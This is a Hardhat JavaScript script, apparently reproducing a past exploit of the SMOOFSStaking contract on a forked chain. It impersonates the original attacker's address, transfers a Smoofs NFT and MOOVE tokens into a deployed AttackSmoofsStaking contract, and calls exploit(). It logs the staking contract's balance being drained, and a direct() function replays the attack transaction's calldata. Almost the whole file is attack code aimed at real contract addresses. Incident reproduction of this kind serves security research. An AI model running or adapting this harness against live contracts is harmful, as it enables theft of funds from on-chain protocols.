const {ethers, network} = require('hardhat');
const {deployContract} = require('./Attack-Deploy');


const ERC20Abi = require('../artifacts//contracts/interface.sol/IERC20.json').abi;
const ERC721Abi = require('../artifacts//contracts/interface.sol/IERC721.json').abi;

const mooveAddr = "0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d";
const smoofsAddr = "0x551eC76C9fbb4F705F6b0114d1B79bb154747D38";
const sMOOFSStakingAddr = "0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C";

const attackContractAddr = "0x367120bf791cC03F040E2574AeA0ca7790D3D2E5";
const smoofsTokenId = 2062;



async function main() {
    const users = await ethers.getSigners();
    const reproducer = users[0];


    const moove = await ethers.getContractAt(ERC20Abi, mooveAddr, reproducer);

    const smoofs = await ethers.getContractAt(ERC721Abi, smoofsAddr, reproducer);

    const AttackSmoofsStaking = await deployContract('AttackSmoofsStaking');
    const AttackSmoofsStakingAddr = await AttackSmoofsStaking.getAddress();

    let ownerOfSmoofsToken = await smoofs.connect(reproducer).ownerOf(smoofsTokenId);



    console.log("moove Balance Of My Contract", await moove.balanceOf(AttackSmoofsStakingAddr));

    console.log("owner Of 2062 Smoofs Token", ownerOfSmoofsToken);

    await beforeAttack(AttackSmoofsStakingAddr);

    ownerOfSmoofsToken = await smoofs.ownerOf(smoofsTokenId);

    console.log("ownerOf2062SmoofsToken", ownerOfSmoofsToken);

    console.log("moove Balance Of My Contract", await moove.balanceOf(AttackSmoofsStakingAddr));

    console.log("moove Balance Of SMOOFSStaking", await moove.balanceOf(sMOOFSStakingAddr));


    await AttackSmoofsStaking.exploit();

    console.log("moove Balance Of My Contract", await moove.balanceOf(AttackSmoofsStakingAddr));

    console.log("moove Balance Of SMOOFSStaking", await moove.balanceOf(sMOOFSStakingAddr));


}

async function beforeAttack(MyContractAddr) {

    await network.provider.request({
        method: "hardhat_impersonateAccount",
        params: ["0x367120bf791cC03F040E2574AeA0ca7790D3D2E5"],//要冒充的目标账户地址
    });


    const attackContractSigner = await ethers.provider.getSigner("0x367120bf791cC03F040E2574AeA0ca7790D3D2E5");

    await network.provider.send("hardhat_setBalance", [
        "0x367120bf791cC03F040E2574AeA0ca7790D3D2E5",
        "0x1000000000000000000",
    ]);

    const moove = await ethers.getContractAt(ERC20Abi, mooveAddr, attackContractSigner);

    const smoofs = await ethers.getContractAt(ERC721Abi, smoofsAddr, attackContractSigner);


    await smoofs.transferFrom(attackContractAddr, MyContractAddr, smoofsTokenId);

    await moove.transfer(MyContractAddr, await moove.balanceOf(attackContractAddr));

}


async function direct() {

    await network.provider.request({
        method: "hardhat_impersonateAccount",
        params: ["0x149b268b8b8101e2b5df84a601327484cb43221c"],//要冒充的目标账户地址
    });
    const signer = await ethers.provider.getSigner("0x149b268b8b8101e2b5df84a601327484cb43221c");

    const moove = await ethers.getContractAt(ERC20Abi, mooveAddr, signer);


    console.log("moove Balance Of My Contract", await moove.balanceOf(attackContractAddr));

    console.log("moove Balance Of SMOOFSStaking", await moove.balanceOf(sMOOFSStakingAddr));

    const tx = {

        to: attackContractAddr,
        data: "0x8927e052"
    };

    await signer.sendTransaction(tx);

    console.log("moove Balance Of My Contract", await moove.balanceOf(attackContractAddr));

    console.log("moove Balance Of SMOOFSStaking", await moove.balanceOf(sMOOFSStakingAddr));



}

direct()